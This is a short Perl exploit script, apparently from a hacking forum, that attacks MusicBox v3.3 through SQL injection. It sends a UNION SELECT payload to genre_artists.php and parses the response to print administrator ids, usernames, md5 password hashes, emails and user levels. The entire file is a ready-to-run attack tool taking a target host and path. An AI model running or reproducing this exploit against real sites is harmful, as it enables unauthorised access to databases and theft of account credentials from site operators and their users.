#!/usr/bin/perl
use LWP::Simple;
print "\n";
print "##############################################################\n";
print "# MusicBox v 3.3 SQL INJECTION EXPLOIT                       #\n";
print "# Author: Ctacok  (Russian)                                  #\n";
print "# Special for Antichat (forum.antichat.ru) and xakep.ru      #\n";
print "##############################################################\n";
print "\n Usage: exploit.pl [host] [path] ";
print "\n EX : exploit.pl www.localhost.com /path/ \n\n";
print "\n userlevel 9 = SuperAdmin ";
print "\n pass = md5($pass)";
if (@ARGV < 2)
{
exit;
}
$host=$ARGV[0];
$path=$ARGV[1];
$vuln = "-1+union+select+1,2,concat(0x3a3a3a,userid,0x3a,username,0x3a,password,0x3a,email,0x3a,userlevel,0x3a3a3a),4,5,6,7+from+users+";
$doc = get($host.$path."genre_artists.php?id=".$vuln."--+&by=ASC");
if ($doc =~ /:::(.+):(.+):(.+):(.+):(.+):::/){
        print "\n[+] Admin id: : $1";
                print "\n[+] Admin username: $2";
                print "\n[+] Admin password: $3";
                print "\n[+] Admin email: $4";
                print "\n[+] Admin userlevel: $5";
}else{
                print "\n My name is Fail, Epic Fail... \n"
}